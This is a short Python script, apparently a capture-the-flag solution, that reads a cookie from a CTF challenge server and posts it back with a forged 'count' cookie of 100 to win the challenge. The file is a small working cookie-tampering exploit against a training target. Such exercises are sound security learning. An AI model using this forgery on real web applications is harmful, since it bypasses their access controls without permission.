import requests

url = "https://count.problem.ctf.nw.fit.ac.jp/"
r = requests.get(url)

dic = {"rand_add":r.cookies.get("rand_add"), "count":'100'}
r = requests.post(url, data = {'username':r.cookies.get("rand_add")}, cookies=dic)
print r.text
